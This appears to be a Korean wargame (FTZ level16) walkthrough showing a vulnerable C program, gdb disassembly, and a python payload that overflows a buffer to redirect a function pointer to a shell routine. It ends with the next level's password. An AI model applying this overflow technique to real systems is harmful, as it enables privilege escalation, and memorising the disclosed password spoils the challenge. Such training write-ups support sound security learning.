@@ -1,0 +1,119 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level16 
+level16@~~~~~<span class="s1">'s password: 
+[level16@ftz level16]$ ls 
+attackme  attackme.c  hint  public_html  tmp 
+[level16@ftz level16]$ cat hint 
+
+
+#include &lt;stdio.h&gt;
+
+void shell() { 
+  setreuid(3097,3097); 
+  system("/bin/sh"); 
+} 
+
+void printit() { 
+  printf("Hello there!\n"); 
+} 
+
+main() 
+{ int crap; 
+  void (*call)()=printit; 
+  char buf[20]; 
+  fgets(buf,48,stdin); 
+  call(); 
+} 
+
+[level16@ftz level16]$
+</span></code></pre></div></div>
+
+<p>level16/about to cause mass으로 접속하자.</p>
+
+<p>hint를 보니 코드가 좀 특이하다.</p>
+
+<p>간단히 설명하면 call이라는 포인터 변수에 printit함수의 주소값을 넣어준다.</p>
+
+<p>입력받고 call이 가르키는 함수를 실행하는 형식이다.</p>
+
+<p>그렇다면 call이 가르키는 주소값을 printit이 아니라 shell로 바꿔주면 클리어할 수 있을 것이다.</p>
+
+<p>한번 gdb 돌려보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level16@ftz level16]<span class="nv">$ </span>gdb attackme 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048518 &lt;main+0&gt;:    push   ebp 
+0x08048519 &lt;main+1&gt;:    mov    ebp,esp 
+0x0804851b &lt;main+3&gt;:    sub    esp,0x38 
+0x0804851e &lt;main+6&gt;:    mov    DWORD PTR <span class="o">[</span>ebp-16],0x8048500 
+0x08048525 &lt;main+13&gt;:   sub    esp,0x4 
+0x08048528 &lt;main+16&gt;:   push   ds:0x80496e8 
+0x0804852e &lt;main+22&gt;:   push   0x30 
+0x08048530 &lt;main+24&gt;:   lea    eax,[ebp-56] 
+0x08048533 &lt;main+27&gt;:   push   eax 
+0x08048534 &lt;main+28&gt;:   call   0x8048384  &lt;fgets&gt;
+0x08048539 &lt;main+33&gt;:   add    esp,0x10 
+0x0804853c &lt;main+36&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-16] 
+0x0804853f &lt;main+39&gt;:   call   eax 
+0x08048541 &lt;main+41&gt;:   leave 
+0x08048542 &lt;main+42&gt;:   ret 
+0x08048543 &lt;main+43&gt;:   nop
+</code></pre></div></div>
+
+<p>main+6에서 call에 printit의 주소값을 넣어주는듯 하다.</p>
+
+<p>call의 주소값 : ebp-16</p>
+
+<p>main+24에서 gets의 인좌로 buf를 보낸다.</p>
+
+<p>buf의 주소값 : ebp-56</p>
+
+<p>call - buf  = 40이므로 아무런 값 40 + shell의 주소값을 넣어주면 될 것이다.</p>
+
+<p>shell의 주소값을 보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas shell 
+Dump of assembler code <span class="k">for function </span>shell: 
+0x080484d0 &lt;shell+0&gt;:   push   ebp 
+0x080484d1 &lt;shell+1&gt;:   mov    ebp,esp 
+0x080484d3 &lt;shell+3&gt;:   sub    esp,0x8 
+0x080484d6 &lt;shell+6&gt;:   sub    esp,0x8 
+0x080484d9 &lt;shell+9&gt;:   push   0xc19 
+0x080484de &lt;shell+14&gt;:  push   0xc19 
+0x080484e3 &lt;shell+19&gt;:  call   0x80483b4 &lt;setreuid&gt;
+0x080484e8 &lt;shell+24&gt;:  add    esp,0x10 
+0x080484eb &lt;shell+27&gt;:  sub    esp,0xc 
+0x080484ee &lt;shell+30&gt;:  push   0x80485b8 
+0x080484f3 &lt;shell+35&gt;:  call   0x8048364  &lt;system&gt;
+0x080484f8 &lt;shell+40&gt;:  add    esp,0x10 
+0x080484fb &lt;shell+43&gt;:  leave 
+0x080484fc &lt;shell+44&gt;:  ret 
+0x080484fd &lt;shell+45&gt;:  lea    esi,[esi] 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>가장 위의 주소값이 0x080484d0 이라 되어있으므로, shell의 주소값 : 0x080484d0</p>
+
+<p>이제 코드를 작성해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level16@ftz level16]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*40+"\xd0\x84\x04\x08"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | ./attackme 
+<span class="nb">whoami 
+</span>level17 
+my-pass 
+
+Level17 Password is <span class="s2">"king poetic"</span><span class="nb">.</span> 
+</code></pre></div></div>
+
+<p>답을 구했다.</p>
+
+<p>level17’s password:”king poetic”</p>
+:ET
